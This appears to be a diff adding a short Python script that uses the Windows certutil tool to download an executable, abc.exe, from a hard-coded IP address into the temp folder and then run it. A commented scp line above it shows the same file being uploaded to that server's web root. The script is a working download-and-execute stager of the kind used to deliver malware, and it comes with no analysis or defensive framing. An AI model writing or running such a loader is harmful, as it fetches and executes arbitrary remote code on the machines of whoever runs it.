@@ -1,0 +1,29 @@
+#scp C:\Users\nairr\OneDrive\Desktop\abc.exe root@72.60.201.21:/var/www/html/abc.exe
+import os
+import subprocess
+import tempfile
+
+temp_dir = tempfile.gettempdir()
+full_path = os.path.join(temp_dir, "abc.exe") # C:\Users\nairr\AppData\Local\Temp\abc.exe
+server_ip = "72.60.201.21"  # Replace with your actual IP
+remote_file = f"http://{server_ip}/abc.exe"
+local_filename = full_path
+
+def download_with_certutil():
+    # -urlcache downloads the file
+    # -f forces the download (overwrites existing)
+    # The last argument is the output filename
+    command = f'certutil -urlcache -f "{remote_file}" "{local_filename}"'
+    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+    print(f"Return code: {result.returncode}")
+
+    if result.returncode == 0:
+        print(f"Download successful! Check for {local_filename}")
+    else:
+        print("Download failed. Error output:")
+        print(result.stderr)
+
+
+if __name__ == "__main__":
+    download_with_certutil()
+    result = subprocess.run(full_path, capture_output=True, text=True)
